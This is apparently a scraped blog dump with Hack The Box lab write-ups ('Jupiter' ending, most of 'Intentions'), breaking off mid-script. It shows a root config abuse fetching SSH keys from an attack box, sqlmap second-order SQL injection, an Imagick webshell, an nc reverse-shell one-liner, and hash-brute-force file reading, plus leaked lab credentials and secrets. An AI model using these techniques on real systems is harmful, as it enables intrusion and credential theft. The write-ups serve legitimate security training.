\u0026#34;LORCA\u0026#34;, \u0026#34;lat\u0026#34;: 37.6725, \u0026#34;lon\u0026#34;: -1.5863, \u0026#34;hgt\u0026#34;: 335.0 }, \u0026#34;show\u0026#34;: [ ], \u0026#34;columns\u0026#34;: [ \u0026#34;name\u0026#34;, \u0026#34;azel\u0026#34;, \u0026#34;dis\u0026#34;, \u0026#34;geo\u0026#34;, \u0026#34;tab\u0026#34;, \u0026#34;pos\u0026#34;, \u0026#34;vel\u0026#34; ] } By searching for \u0026ldquo;sattrack\u0026rdquo; with the parameters extracted from the configuration file, I found a GitHub repository named arftracksat, which provides insights into the application and its configurations. The interesting ones being:\ntleroot: The main directory for downloads. tlefile: The file within the directory specified by tleroot for downloads. tlesources: The URL for downloading the file. Considering that the sattrack binary can be executed as root, I can write an authorized_keys file to root\u0026rsquo;s SSH directory by downloading it from my attack box. tleresources also supports the file:// URI which means I can also read files as root.\n\u0026#34;tleroot\u0026#34;: \u0026#34;/root/.ssh/\u0026#34;, \u0026#34;tlefile\u0026#34;: \u0026#34;authorized_keys\u0026#34;, \u0026#34;tlesources\u0026#34;: [ \u0026#34;http://10.10.14.16/authorized_keys\u0026#34; ], When the \u0026ldquo;sattrack\u0026rdquo; binary is executed with root privileges, it fetches the file from the HTTP server hosted on my attack box and saves it to the location specified in its configurations.\n(remote) jovian@jupiter:/tmp$ sudo /usr/local/bin/sattrack Satellite Tracking System Get:0 http://10.10.14.16/authorized_keys Satellites loaded No sats Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.129.229.15 - - [22/Jun/2023 20:16:14] \u0026#34;GET /authorized_keys HTTP/1.1\u0026#34; 200 - Using the the identity key, I can login as root via SSH.\n\u0026gt; ssh -i id_rsa.root root@jupiter.htb root@jupiter:~# id uid=0(root) gid=0(root) groups=0(root) root@jupiter:~# ls -la root.txt -rw-r----- 1 root root 33 Jun 22 13:51 root.txt root@jupiter:~# Pwned!!\nroot@jupiter:~# cat /etc/shadow | grep root root:$y$j9T$IW34JPHywVa4Fs590kLAs1$L2hNBUYic4PnYnxpIGE7HXzv.DaeGC4eLE9KJOU6f77:19482:0:99999:7::: Related Links # Data source HTTP API | Grafana documentation PayloadsAllTheThings/SQL Injection/PostgreSQL Injection.md at master · swisskyrepo/PayloadsAllTheThings · GitHub Authenticated Arbitrary Command Execution on PostgreSQL 9.3 \u0026gt; Latest | by Greenwolf | Greenwolf Security | Medium GitHub - shadow/shadow: Shadow is a discrete-event network simulator that directly executes real application code, enabling you to simulate distributed systems with thousands of network-connected processes in realistic and scalable private network experiments using your laptop, desktop, or server running Linux. Executing terminal commands in Jupyter notebook - Stack Overflow GitHub - arf20/arftracksat: Satellite tracking software for linux ","date":"22 October 2023","permalink":"/blog/htb-jupiter/","section":"Blog Posts","summary":"Jupiter is a medium HTB box where I began by exploiting a supposed feature in Grafana to execute commands and gain an initial foothold. After establishing a foothold, I took advantage of configuration issues within a script executed by the Shadow Simulator via a cron job. Then, I discovered Jupyter server tokens in log files and leveraged them to execute commands within a Jupyter notebook. Finally, I exploited a customized version of arftracksat, a satellite tracking system, with the ability to run as the root user, elevating my privileges on the system.","title":"HTB Jupiter"},{"content":"","date":null,"permalink":"/tags/jupyter/","section":"Tags","summary":"","title":"Jupyter"},{"content":"","date":null,"permalink":"/tags/postgres-command-execution/","section":"Tags","summary":"","title":"Postgres-Command-Execution"},{"content":"","date":null,"permalink":"/tags/raw-sql-query/","section":"Tags","summary":"","title":"Raw-SQL-Query"},{"content":"","date":null,"permalink":"/tags/shadow-simulator/","section":"Tags","summary":"","title":"Shadow-Simulator"},{"content":"","date":null,"permalink":"/tags/bruteforcing-hashes/","section":"Tags","summary":"","title":"Bruteforcing-Hashes"},{"content":"","date":null,"permalink":"/tags/cap_dac_read_search/","section":"Tags","summary":"","title":"Cap_dac_read_search"},{"content":"","date":null,"permalink":"/tags/capabilities/","section":"Tags","summary":"","title":"Capabilities"},{"content":"","date":null,"permalink":"/tags/git/","section":"Tags","summary":"","title":"Git"},{"content":"HTB Intentions #Overview # Intentions is a Hard linux box that involving a second-order SQL injection vulnerability which enables the extraction of admin password hashes. Leveraging a different API endpoint, these hashes can be used to access the admin page. Within the admin page, there\u0026rsquo;s a feature to modify images, which relies on Imagick. This opens up an opportunity to exploit arbitrary object instantiation, ultimately allowing to write a PHP webshell and establishing a foothold. After gaining access to the system, credentials are found in an old Git commit in the website\u0026rsquo;s repository. These credentials are reused for SSH access, allowing access to a user capable of running a copyright_scanner application, which has the CAP_DAC_READ_SEARCH capability. This capability can be exploited to read files as the root user.\nEnumeration # Open Ports #Found two open ports\nport 22 → SSH port 80 → HTTP server The port 4444 also seems to be open, but that looks like a false positive\nnmap -p22,80,4444 -sV -sC -T4 -Pn -oA 10.10.11.220 10.10.11.220 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-12 19:40 EDT Nmap scan report for 10.10.11.220 Host is up (0.060s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 47d20066275ee69c808903b58f9e60e5 (ECDSA) |_ 256 c8d0ac8d299b87405f1bb0a41d538ff1 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Intentions 4444/tcp open krb524? Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel port 80 - HTTP #Based on the response headers, the website seems to employ a session cookie and JWT token for its functionality.\n\u0026gt; http -ph 10.10.11.220 HTTP/1.1 200 OK ...snip... ...snip... Server: nginx/1.18.0 (Ubuntu) Set-Cookie: XSRF-TOKEN=eyJpdiI6IndVR0c0dFZTdWQxOWNCRVpMbDhyWVE9PSIsInZhbHVlIjoiTDN3SGJnWFRvczNFcmROak5kYlFuZkQ5cUFtMkMvOGEzT3BCV09DLzh0ZTZoRHViSDRvSVNqNkdTSCtiK0lOdDhKU1Q0WHd2T0JMazBhZ2JpL3lDVlBuamlTdm9zaGVuQklTRkJDUElWa0t0N2RJQlRwSGJRQjNnTzFabk10a0IiLCJtYWMiOiI4ZGNlMDA3MDhhODAzYWM2YzA0ZmUxNWMzMjQ3NmExM2RlY2UzZWY2ZGUyZTk2MjhjYmFiNmNiYzdiOTBhYTkwIiwidGFnIjoiIn0%3D; expires=Thu, 13-Jul-2023 01:46:05 GMT; Max-Age=7200; path=/; samesite=lax Set-Cookie: intentions_session=eyJpdiI6IkxsdGdNVmtPV1p4Ry9yaWlGejFjN3c9PSIsInZhbHVlIjoib1RlMm9TWHFSYnIwZjB2NVp1cndPRHN1dWVMa0FNV2ZUYzl2eFJkb3NQaGVzYXR3QW1tL2ZKcklOZlZxNHBNN25RTVpHN1ZwRWxDRnhXNmlWMHZmbzRETE1OcFQwVUVBR1V2TUNwWW1xZktjU2lTc2Z2VXhaenM2S0ZnMis0ZmkiLCJtYWMiOiIzNzZmNjkxMGNjMzFlMDc4ZmViN2Y1ZWI3MzIyZGMwNjU1OTZhNjAxMzZiNjg4MGI0N2Q3NWI1NTE4OWQ1OTlkIiwidGFnIjoiIn0%3D; expires=Thu, 13-Jul-2023 01:46:05 GMT; Max-Age=7200; ...snip... \u0026gt; urldecode \u0026#39;eyJpdiI6IndVR0c0dFZTdWQxOWNCRVpMbDhyWVE9PSIsInZhbHVlIjoiTDN3SGJnWFRvczNFcmROak5kYlFuZkQ5cUFtMkMvOGEzT3BCV09DLzh0ZTZoRHViSDRvSVNqNkdTSCtiK0lOdDhKU1Q0WHd2T0JMazBhZ2JpL3lDVlBuamlTdm9zaGVuQklTRkJDUElWa0t0N2RJQlRwSGJRQjNnTzFabk10a0IiLCJtYWMiOiI4ZGNlMDA3MDhhODAzYWM2YzA0ZmUxNWMzMjQ3NmExM2RlY2UzZWY2ZGUyZTk2MjhjYmFiNmNiYzdiOTBhYTkwIiwidGFnIjoiIn0%3D\u0026#39; | base64 -d | jq { \u0026#34;iv\u0026#34;: \u0026#34;wUGG4tVSud19cBEZLl8rYQ==\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;L3wHbgXTos3ErdNjNdbQnfD9qAm2C/8a3OpBWOC/8te6hDubH4oISj6GSH+b+INt8JST4XwvOBLk0agbi/yCVPnjiSvoshenBISFBCPIVkKt7dIBTpHbQB3gO1ZnMtkB\u0026#34;, \u0026#34;mac\u0026#34;: \u0026#34;8dce00708a803ac6c04fe15c32476a13dece3ef6de2e9628cbab6cbc7b90aa90\u0026#34;, \u0026#34;tag\u0026#34;: \u0026#34;\u0026#34; } The website is PHP-based because accessing /index.php leads to the same index page. However, the site offers minimal information, mainly offering options for login and registration.\nDirectory Enumeration #While fuzzing for files and directories, I came across a few interesting directories, and an empty robots.txt file.\n\u0026gt; ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.11.220/FUZZ -o ffuf_intentions.md -of md -t 100 -fs 162 ...snip... ...snip... admin [Status: 302, Size: 322, Words: 60, Lines: 12, Duration: 288ms] css [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 60ms] favicon.ico [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 59ms] fonts [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 59ms] gallery [Status: 302, Size: 322, Words: 60, Lines: 12, Duration: 522ms] index.php [Status: 200, Size: 1523, Words: 415, Lines: 40, Duration: 702ms] js [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 80ms] logout [Status: 302, Size: 322, Words: 60, Lines: 12, Duration: 677ms] robots.txt [Status: 200, Size: 24, Words: 2, Lines: 3, Duration: 277ms] storage [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 123ms] Fuzzing recursively with feroxbuster due to the presence of directories like admin and js. Although there was no content under /admin, but there were a few interesting JS files, including admin.js and login.js.\n\u0026gt; feroxbuster -u http://10.10.11.220/ -x php,txt,js ...snip... ...snip... 200 GET 2l 6382w 311246c http://10.10.11.220/js/admin.js 200 GET 2l 5429w 279176c http://10.10.11.220/js/login.js 302 GET 12l 22w 0c http://10.10.11.220/gallery =\u0026gt; http://10.10.11.220 200 GET 2l 7687w 433792c http://10.10.11.220/js/app.js 200 GET 2l 6188w 310841c http://10.10.11.220/js/gallery.js 200 GET 39l 94w 0c http://10.10.11.220/index.php ...snip... ...snip... The admin.js file has some interesting content:\nProduction environment hosts a v2 API deployment. The v2 API seems to transmit password hashes instead of clear text passwords, presumably to enhance security. The v2 API has some image editing functionalities, likely using the Imagick PHP module. Content from admin.js Foothold # Successfully registered a user using the registration feature. It appears that there\u0026rsquo;s a gallery and a user feed on the platform, featuring images that can be tagged by genres.\nAfter walking the application, it\u0026rsquo;s clear the feed content is dependent on genre preferences in the profile settings. Modifying the genre results in corresponding changes to the feed content.\nAlthough, response of a union injection is interesting. All spaces within the payload are stripped out. This can potentially be circumvented by replacing the spaces with SQL comments (/**/).\nUnion injection payload\n{ \u0026#34;genres\u0026#34;: \u0026#34;food,travel,nature\u0026#39; union select 1 -- -\u0026#34; } There might be an escape function in place to sanitize the input for genres. However, since this input has an impact on the feed, there is a potential for exploiting second-order SQL injection.\nUsing sqlmap, discovered a second-order SQL injection in there. I successfully exploited the vulnerability using sqlmap, which indicates that the backend database is MariaDB.\ngallery_genres.req: The POST request to change the genres → the injection point galley_feed.req: The GET request for the user feed space2comment: A sqlmap tamper script to replace spaces with comments, bypassing the sanitization process. \u0026gt; sqlmap -r gallery_genres.req --level 5 --risk 3 --second-req gallery_feed.req --batch --tamper=space2comment --threads 10 [21:08:39] [INFO] (custom) POST parameter \u0026#39;JSON genres\u0026#39; is \u0026#39;MySQL UNION query (NULL) - 1 to 20 columns\u0026#39; injectable (custom) POST parameter \u0026#39;JSON genres\u0026#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N sqlmap identified the following injection point(s) with a total of 300 HTTP(s) requests: --- Parameter: JSON genres ((custom) POST) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: {\u0026#34;genres\u0026#34;:\u0026#34;food,travel,nature\u0026#39;) AND 2611=2611 AND (\u0026#39;pGZT\u0026#39;=\u0026#39;pGZT\u0026#34;} Type: time-based blind Title: MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: {\u0026#34;genres\u0026#34;:\u0026#34;food,travel,nature\u0026#39;) AND (SELECT 5190 FROM (SELECT(SLEEP(5)))jJoL) AND (\u0026#39;LKKQ\u0026#39;=\u0026#39;LKKQ\u0026#34;} Type: UNION query Title: MySQL UNION query (NULL) - 7 columns Payload: {\u0026#34;genres\u0026#34;:\u0026#34;food,travel,nature\u0026#39;) UNION ALL SELECT NULL,CONCAT(0x71707a7671,0x6959496e6664714d6c4255494f416975476363525a6d6b7957427a6e7450636b4d536f6b4e68554e,0x7170787a71),NULL,NULL,NULL#\u0026#34;} --- [21:08:39] [WARNING] changes made by tampering scripts are not included in shown payload content(s) [21:08:39] [INFO] the back-end DBMS is MySQL web server operating system: Linux Ubuntu web application technology: Nginx 1.18.0 back-end DBMS: MySQL \u0026gt;= 5.0.12 (MariaDB fork) Exploiting the vulnerability revealed a database named intentions and a couple interesting tables like personal_access_tokens and users.\n\u0026gt; sqlmap -r gallery_genres.req --level 5 --risk 3 --second-req gallery_feed.req --batch --tamper=space2comment --threads 10 --dbs ...snip... [21:14:00] [INFO] fetching database names available databases [2]: [*] information_schema [*] intentions ...snip... \u0026gt; sqlmap -r gallery_genres.req --level 5 --risk 3 --second-req gallery_feed.req --batch --tamper=space2comment --threads 10 -D intentions --tables ...snip... [21:16:57] [INFO] fetching tables for database: \u0026#39;intentions\u0026#39; Database: intentions [4 tables] +------------------------+ | gallery_images | | migrations | | personal_access_tokens | | users | +------------------------+ ...snip... Dumped the users table and retrieved information for two admin users: steve and greg, including their corresponding password hashes. The password hashes are encrypted using bcrypt with 10 iterations, which means that decrypting wouldn\u0026rsquo;t be practical.\n\u0026gt; sqlmap -r gallery_genres.req --level 5 --risk 3 --second-req gallery_feed.req --batch --tamper=space2comment --threads 10 -D intentions -T users --dump Database: intentions Table: users [33 entries] +----+--------------------------+-------+-------------------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------------------------------+---------------------+---------------------+ | id | name | admin | email | genres | password | created_at | updated_at | +----+--------------------------+-------+-------------------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------------------------------+---------------------+---------------------+ | 1 | steve | 1 | steve@intentions.htb | food,travel,nature | $2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa | 2023-02-02 17:43:00 | 2023-02-02 17:43:00 | | 2 | greg | 1 | greg@intentions.htb | food,travel,nature | $2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m | 2023-02-02 17:44:11 | 2023-02-02 17:44:11 | | 3 | Melisa Runolfsson | 0 | hettie.rutherford@example.org | food,travel,nature Referring back to the information obtained from the admin.js file, it was revealed that the v2 API offers authentication using hashes. So, there is no need to crack the password hash. When sending login requests through the v2 API, the response specifies the necessity of a hash POST parameter for authentication.\nv2 API error By including the hash parameter along with its associated value in the request, a 200 response is generated. Furthermore, this response includes the setting of a token cookie, which contains a JWT for the user steve.\nSuccessful admin login via v2 API Given that Steve possesses admin privileges, utilizing their cookie and navigating to /admin successfully grants access to the admin page. This page corresponds to the JavaScript file uncovered previously.\nAdmin Page The admin page includes a new Images tab, whereas the user feed and profile settings are no longer present. It provides a list of images used in the application, along with an option to edit them.\nAdmin images The edit page contains information about the selected image, including various effects and other details related to it.\nWhen applying one of the effects, a request is sent to the /api/v2/admin/image/modify endpoint. This endpoint expects two parameters, path and effect, and in return, it provides an image data URL as a response.\nModify image endpoint The endpoint accepts a file path. However, when attempting to use a URI, link to an image on my attack box hosted via an HTTP server or the file:// format, both methods simply return a data URL. Considering the Imagick module is being used for the modifications, found an exploit that involves arbitrary object instantiations in PHP: Exploiting Arbitrary Object Instantiations in PHP without Custom Classes – PT SWARM\nThe exploit employs an MSL file and suggests brute-force for remote code execution, both of which might not be feasible in this scenario. Another approach involves utilizing a VID schema. In ImageMagick, the ReadVIDImage function is used for reading VID schemas, which relies on ExpandFilenames. This function expands arguments if they contain wildcards. By exploiting this behavior, the MSL file can be included in the request. Using two additional schemas, info and caption, a webshell can be written with a single request. Given that the body of the request will carry the MSL file, the request\u0026rsquo;s arguments are transmitted as GET parameters. The effect parameter remains unchanged, while the path parameter is configured as a VID schema.\nWith the option to create a webshell, the next step was making it externally accessible to execute the payload. Based on the information of images from the admin page, files are stored at /var/www/html/intentions/storage/app/public/* can be accessed externally using the format http://\u0026lt;IP\u0026gt;/storage/\u0026lt;filename\u0026gt;.\nActual Exploit Sending this request creates a shell at http://\u0026lt;IP\u0026gt;/storage/shell.php, which can gives the ability to execute remote commands using the cmd parameter.\n\u0026gt; http -pb intentions.htb/storage/shell.php cmd==id caption:uid=33(www-data) gid=33(www-data) groups=33(www-data) CAPTION 120x120 120x120+0+0 16-bit sRGB 2.960u 0:02.962 Using a reverse shell payload, got a shell as www-data\n\u0026gt; http -pb intentions.htb/storage/shell.php cmd==\u0026#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.14.20 9005 \u0026gt;/tmp/f\u0026#39; \u0026gt; pc -lp 9005 [03:16:33] Welcome to pwncat 🐈! __main__.py:164 [03:16:40] received connection from 10.10.11.220:42804 bind.py:84 [03:16:41] 0.0.0.0:9005: upgrading from /usr/bin/dash to /usr/bin/bash manager.py:957 [03:16:42] 10.10.11.220:42804: registered new host w/ db manager.py:957 (local) pwncat$ (remote) www-data@intentions:/var/www/html/intentions/storage/app/public$ id uid=33(www-data) gid=33(www-data) groups=33(www-data) Shell as greg # Based on the contents of the /home directory and /etc/passwd there are two other user with login shells, legal and greg.\n(remote) www-data@intentions:/var/www/html/intentions$ ls -la /home/ total 20 drwxr-xr-x 5 root root 4096 Jun 10 14:56 . drwxr-xr-x 18 root root 4096 Jun 19 13:34 .. drwxr-x--- 4 greg greg 4096 Jul 14 09:28 greg drwxr-x--- 4 legal legal 4096 Jun 19 13:09 legal drwxr-x--- 4 steven steven 4096 Jun 19 13:09 steven (remote) www-data@intentions:/var/www/html/intentions$ cat /etc/passwd | grep sh$ root❌0:0:root:/root:/bin/bash steven❌1000:1000:steven:/home/steven:/bin/bash greg❌1001:1001::/home/greg:/bin/sh legal❌1002:1002:,,,:/home/legal:/bin/bash A .gitignore file exists in the public directory, indicating there\u0026rsquo;s a git repo somewhere.\n(remote) www-data@intentions:/var/www/html/intentions/storage/app/public$ ls -la total 32 drwxr-xr-x 6 www-data www-data 4096 Jul 16 07:15 . drwxr-xr-x 3 www-data www-data 4096 Feb 2 16:41 .. -rw-r--r-- 1 www-data www-data 14 Apr 12 2022 .gitignore drwxr-xr-x 2 root root 4096 Feb 2 01:09 animals drwxr-xr-x 2 root root 4096 Feb 2 01:08 architecture drwxr-xr-x 2 root root 4096 Feb 2 01:07 food drwxr-xr-x 2 root root 4096 Feb 2 01:07 nature -rw-r--r-- 1 www-data www-data 95 Jul 16 07:15 shell.php (remote) www-data@intentions:/var/www/html/intentions/storage/app/public$ cat .gitignore * !.gitignore Going up a few directories, identified a git repository situated at /var/www/html/intentions, as indicated by the presence of the .git/ directory.\n(remote) www-data@intentions:/var/www/html/intentions$ ls -la total 820 drwxr-xr-x 14 root root 4096 Feb 2 17:55 . drwxr-xr-x 3 root root 4096 Feb 2 17:55 .. -rw-r--r-- 1 root root 1068 Feb 2 17:38 .env drwxr-xr-x 8 root root 4096 Feb 3 00:51 .git ...snip... The .env file contains several interesting details including the application key, database username and password, and the JWT secret.\nremote) www-data@intentions:/var/www/html/intentions$ cat .env APP_NAME=Intentions APP_ENV=production APP_KEY=base64:YDGHFO792XTVdInb9gGESbGCyRDsAIRCkKoIMwkyHHI= APP_DEBUG=false APP_URL=http://intentions.htb ...snip... ...snip... DB_CONNECTION=mysql DB_HOST=localhost DB_PORT=3306 DB_DATABASE=intentions DB_USERNAME=laravel DB_PASSWORD=02mDWOgsOga03G385!!3Plcx ...snip... ...snip... JWT_SECRET=yVH9RCGPMXyzNLoXrEsOl0klZi3MAxMHcMlRAnlobuSO8WNtLHStPiOUUgfmbwPt I couldn\u0026rsquo;t enumerate the repository because of an ownership issue of root directory.\n(remote) www-data@intentions:/var/www/html/intentions$ git log fatal: detected dubious ownership in repository at \u0026#39;/var/www/html/intentions\u0026#39; To add an exception for this directory, call: git config --global --add safe.directory /var/www/html/intentions (remote) www-data@intentions:/var/www/html/intentions$ git config --global --add safe.directory /var/www/html/intentions error: could not lock config file /var/www/.gitconfig: Permission denied) The only viable approach for to enumerate the repository involves archiving it and subsequently downloading the generated archive.\n(remote) www-data@intentions:/tmp$ tar -cf intentions.tar /var/www/html/intentions tar: Removing leading `/\u0026#39; from member names (local) pwncat$ download intentions.tar intentions.tar 100.0% • 270.5/270.5 MB • 1.6 MB/s • 0:00:00 [03:53:25] downloaded 270.51Mi━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━B in 5.0 minutes and 11 seconds download.py:71 (local) pwncat$ Judging by the commit message, it\u0026rsquo;s possible that the second-to-last commit in the git log could reveal something of interest.\n\u0026gt; git lg 1f29dfd steve (5 months ago) - Fix webpack for production (HEAD -\u0026gt; master) f7c903a greg (5 months ago) - Test cases did not work on steve\u0026#39;s local database, switching to user factory per his advice 36b4287 greg (5 months ago) - Adding test cases for the API! d7ef022 steve (5 months ago) - Initial v2 commit (END) The diff for the mentioned commit contains the password for the user, greg → greg:Gr3g1sTh3B3stDev3l0per!1998!\n\u0026gt; git show f7c903a commit f7c903a54cacc4b8f27e00dbf5b0eae4c16c3bb4 Author: greg \u0026lt;greg@intentions.htb\u0026gt; Date: Thu Jan 26 09:21:52 2023 +0100 Test cases did not work on steve\u0026#39;s local database, switching to user factory per his advice diff --git a/tests/Feature/Helper.php b/tests/Feature/Helper.php index f57e37b..0586d51 100644 --- a/tests/Feature/Helper.php +++ b/tests/Feature/Helper.php @@ -8,12 +8,14 @@ class Helper extends TestCase { public static function getToken($test, $admin = false) { if($admin) { - $res = $test-\u0026gt;postJson(\u0026#39;/api/v1/auth/login\u0026#39;, [\u0026#39;email\u0026#39; =\u0026gt; \u0026#39;greg@intentions.htb\u0026#39;, \u0026#39;password\u0026#39; =\u0026gt; \u0026#39;Gr3g1sTh3B3stDev3l0per!1998!\u0026#39;]); - return $res-\u0026gt;headers-\u0026gt;get(\u0026#39;Authorization\u0026#39;); + $user = User::factory()-\u0026gt;admin()-\u0026gt;create(); } else { - $res = $test-\u0026gt;postJson(\u0026#39;/api/v1/auth/login\u0026#39;, [\u0026#39;email\u0026#39; =\u0026gt; \u0026#39;greg_user@intentions.htb\u0026#39;, \u0026#39;password\u0026#39; =\u0026gt; \u0026#39;Gr3g1sTh3B3stDev3l0per!1998!\u0026#39;]); - return $res-\u0026gt;headers-\u0026gt;get(\u0026#39;Authorization\u0026#39;); + $user = User::factory()-\u0026gt;create(); } + + $token = Auth::login($user); + $user-\u0026gt;delete(); + return $token; } } Although the new credentials didn\u0026rsquo;t provide any additional insights on the website, they were reused for Greg\u0026rsquo;s local account. As a result, logged in through SSH.\n(local) pwncat$ connect greg:Gr3g1sTh3B3stDev3l0per!1998!@intentions.htb [06:04:53] intentions.htb:22: upgrading from /usr/bin/dash to /usr/bin/bash manager.py:957 [06:04:54] intentions.htb:22: loaded known host from db manager.py:957 (local) pwncat$ (remote) greg@intentions:/home/greg$ id uid=1001(greg) gid=1001(greg) groups=1001(greg),1003(scanner) (remote) greg@intentions:/home/greg$ Privilege Escalation to root # Unfortunately, Greg lacks sudo privileges\n(remote) greg@intentions:/home/greg$ sudo -l [sudo] password for greg: Sorry, user greg may not run sudo on intentions. Greg, interestingly, is also a member of the scanner group. While searching for files accessible to the group, discovered the scanner binary, owned by root.\n(remote) greg@intentions:/home/greg$ id uid=1001(greg) gid=1001(greg) groups=1001(greg),1003(scanner) (remote) greg@intentions:/home/greg$ find / -group scanner 2\u0026gt;/dev/null /opt/scanner /opt/scanner/scanner (remote) greg@intentions:/home/greg$ ls -la /opt/scanner/scanner -rwxr-x--- 1 root scanner 1437696 Jun 19 11:18 /opt/scanner/scanner (remote) greg@intentions:/home/greg$ file /opt/scanner/scanner /opt/scanner/scanner: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=a7sTitVjvr1qc4Ngg3jt/LY6QPsAiDYUOHaK7gUXN/5aWVPmSwER6KHrDxGzr4/SUP48whD2UTLJ-Q2kLmf, stripped (remote) greg@intentions:/home/greg$ getcap /opt/scanner/scanner /opt/scanner/scanner cap_dac_read_search=ep The capability the file has, CAP_DAC_READ_SEARCH essentially means it can read any file on the box.\nCAP_DAC_READ_SEARCH\r• Bypass file read permission checks and directory read\rand execute permission checks;\r• invoke open_by_handle_at(2);\r• use the linkat(2) AT_EMPTY_PATH flag to create a link\rto a file referred to by a file descriptor.\rAs there no manual page entries were available for scanner, the -h or --help options are the most effective approach to gather additional information about the binary. According to the help message, it appears to be a utility that uses MD5 hashes to identify copyrighted data.\n(remote) greg@intentions:/home/greg$ /opt/scanner/scanner --help The copyright_scanner application provides the capability to evaluate a single file or directory of files against a known blacklist and return matches. This utility has been developed to help identify copyrighted material that have previously been submitted on the platform. This tool can also be used to check for duplicate images to avoid having multiple of the same photos in the gallery. File matching are evaluated by comparing an MD5 hash of the file contents or a portion of the file contents against those submitted in the hash file. The hash blacklist file should be maintained as a single LABEL:MD5 per line. Please avoid using extra colons in the label as that is not currently supported. Expected output: 1. Empty if no matches found 2. A line for every match, example: [+] {LABEL} matches {FILE} -c string Path to image file to check. Cannot be combined with -d -d string Path to image directory to check. Cannot be combined with -c -h string Path to colon separated hash file. Not compatible with -p -l int Maximum bytes of files being checked to hash. Files smaller than this value will be fully hashed. Smaller values are much faster but prone to false positives. (default 500) -p [Debug] Print calculated file hash. Only compatible with -c -s string Specific hash to check against. Not compatible with -h Also, found a bash script in the home directory that executes scanner against some documents in /home/legal/uploads. Unfortunately, greg has no write access in that directory, but scanner does via the capability.\n(remote) greg@intentions:/home/greg$ cat dmca_check.sh /opt/scanner/scanner -d /home/legal/uploads -h /home/greg/dmca_hashes.test When trying to test scanner\u0026rsquo;s functionality, I noticed that the hashes were different\n(remote) greg@intentions:/tmp$ echo -n \u0026#39;1234\u0026#39; \u0026gt; scanner_test (remote) greg@intentions:/tmp$ md5sum scanner_test 81dc9bdb52d04dc20036dbd8313ed055 scanner_test (remote) greg@intentions:/tmp$ /opt/scanner/scanner -c ./scanner_test -s \u0026#39;81dc9bdb52d04dc20036dbd8313ed055\u0026#39; -p [DEBUG] ./scanner_test has hash 8b2460b545079292869605c18cc18c81 According to the information from the help page, the number of hashed bytes can be defined using the -l option. By setting the number of bytes to 4, as in the example provided, the correct hash is generated. This explains why the mismatched hashes when the -l option wasn\u0026rsquo;t utilized, as the default size is 500 bytes.\n(remote) greg@intentions:/tmp$ /opt/scanner/scanner -c /tmp/scanner_test -s \u0026#39;81dc9bdb52d04dc20036dbd8313ed055\u0026#39; -p -l 1 [DEBUG] /tmp/scanner_test has hash c4ca4238a0b923820dcc509a6f75849b (remote) greg@intentions:/tmp$ echo -n \u0026#39;1\u0026#39; | md5sum - c4ca4238a0b923820dcc509a6f75849b - (remote) greg@intentions:/tmp$ /opt/scanner/scanner -c /tmp/scanner_test -s \u0026#39;81dc9bdb52d04dc20036dbd8313ed055\u0026#39; -p -l 2 [DEBUG] /tmp/scanner_test has hash c20ad4d76fe97759aa27a0c99bff6710 (remote) greg@intentions:/tmp$ echo -n \u0026#39;12\u0026#39; | md5sum - c20ad4d76fe97759aa27a0c99bff6710 - (remote) greg@intentions:/tmp$ /opt/scanner/scanner -c /tmp/scanner_test -s \u0026#39;81dc9bdb52d04dc20036dbd8313ed055\u0026#39; -p -l 3 [DEBUG] /tmp/scanner_test has hash 202cb962ac59075b964b07152d234b70 (remote) greg@intentions:/tmp$ echo -n \u0026#39;123\u0026#39; | md5sum - 202cb962ac59075b964b07152d234b70 - (remote) greg@intentions:/tmp$ /opt/scanner/scanner -c /tmp/scanner_test -s \u0026#39;81dc9bdb52d04dc20036dbd8313ed055\u0026#39; -p -l 4 [DEBUG] /tmp/scanner_test has hash 81dc9bdb52d04dc20036dbd8313ed055 [+] 81dc9bdb52d04dc20036dbd8313ed055 matches /tmp/scanner_test This functionality could potentially be exploited to read files by essentially brute-forcing the hashes. Given that the binary is owned by the root user, ideally it could be used to read any file on the system. It would take too long to do this manually, so wrote a python script to automate the process.\nBrute-force automation script #The script consists of the following functions:\ngrab_hash(): Retrieves the hash generated by the scanner binary gen_hash(): Generates an MD5 hash. correct_char(): Compares hashes obtained from both functions to identify the character corresponding to the hash produced by the scanner binary The script accepts a filename as a parameter and then initiates an infinite loop with the counter beginning at 1. Within each loop iteration:\nThe grab_hash() function is invoked with increasing hash lengths. The hash obtained from grab_hash() is passed to correct_char() to identify the correct character. The correct_char() generates md5 hashes for the decoded data + a character from the charset and matches it to the hash from scanner. If a match is found, the character is appended to the decoded data. Within correct_char(), MD5 hashes are generated for the decoded data plus a character from the charset, and compared to the hash obtained from the scanner. If a match is found, the character is added to the decoded data. In case no match is found, the infinite loop terminates, indicating either the complete data retrieval or the absence of the target character within the character set. #!/usr/bin/env python import hashlib import string import subprocess import sys from itertools import count def grab_hash(fileName: str, hash_length: int, hash_value: str = \u0026#34;test_hash\u0026#34;): # command = f\u0026#34;/opt/scanner/scanner -c {fileName} 